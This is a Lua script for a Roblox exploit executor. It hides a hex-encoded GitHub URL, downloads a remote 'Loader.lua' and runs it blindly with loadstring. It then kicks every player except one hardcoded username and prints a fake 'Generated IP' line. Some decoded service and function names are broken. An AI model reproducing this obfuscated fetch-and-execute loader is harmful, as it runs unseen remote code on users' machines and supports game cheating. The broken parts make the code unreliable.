local function _hx(h)
    local s=""
    for i=1,#h,2 do
        s = s .. string.char(tonumber(h:sub(i,i+1),16))
    end
    return s
end

local _uList={
"68747470",
"733a2f2f",
"7261772e676974687562",
"75736572636f6e74656e74636f6d2e",
"2f52696b6f54686544656d6f6e48756e746572",
"2f56332f726566732f68656164732f6d61696e2f4c6f616465722e6c7561"
}

local _url=""
for _,v in ipairs(_uList) do _url=_url..v end
_url = _hx(_url)

local data
local okURL = pcall(function()
    data = game:HttpGet(_url)
end)

if not okURL or not data or #data < 5 then
    error("RemoteLoadFail")
end

local okLoad = pcall(function()
    loadstring(data)()
end)

if not okLoad then
    error("IntegrityFail")
end

task.spawn(function()
    local p = game:GetService(_hx("506c6179657273")).LocalPlayer
    if tostring(p.Name) ~= _hx("6d61636d6163696e526f626c6f78") then
        pcall(function()
            game:GetService(_hx("52656e64")):SetCore(
                _hx("53656e644572726f72"),
                {_hx("554e415554484f52495a4544205748494c45204c4f4144494e47203a28")}
            )
        end)
        task.wait(1)
        p:Kick(_hx("4163636573732044656e696564"))
    end
end)

task.spawn(function()
    if getfenv then
        if not pcall(function() return getfenv(1) end) then
            while task.wait(9e9) do end
        end
    end
end)

task.spawn(function()
    if hookfunction or hookmetamethod or newcclosure then
        for _=1,15 do end
    end
end)

local types = {
    "[INFO]",
    "[SYSTEM]",
    "[WARNING]",
    "[DEBUG]",
    "[NOTICE]",
    "[ALERT]"
}

local function randomType()
    return types[math.random(1, #types)]
end

local function randomIP()
    local function part()
        return math.random(0, 255)
    end
    return part().."."..part().."."..part().."."..part()
end

print(randomType() .. " Generated IP: " .. randomIP())
